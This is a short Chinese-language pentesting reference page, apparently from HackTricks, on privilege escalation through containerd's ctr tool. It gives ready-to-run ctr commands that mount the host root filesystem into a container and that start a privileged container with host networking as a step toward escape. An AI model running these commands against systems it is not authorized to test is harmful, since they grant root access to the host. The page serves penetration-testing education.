# Containerd (ctr) 提权

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

前往以下链接了解 **什么是 containerd** 和 `ctr`：

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE 1

如果你发现主机包含 `ctr` 命令：
```bash
which ctr
/usr/bin/ctr
```
您可以列出图像：
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
然后**运行其中一个镜像，将主机根文件夹挂载到它上**：
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

运行一个特权容器并从中逃逸。\
您可以通过以下方式运行特权容器：
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
然后您可以使用以下页面中提到的一些技术来**利用特权能力逃脱**：

{{#ref}}
docker-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
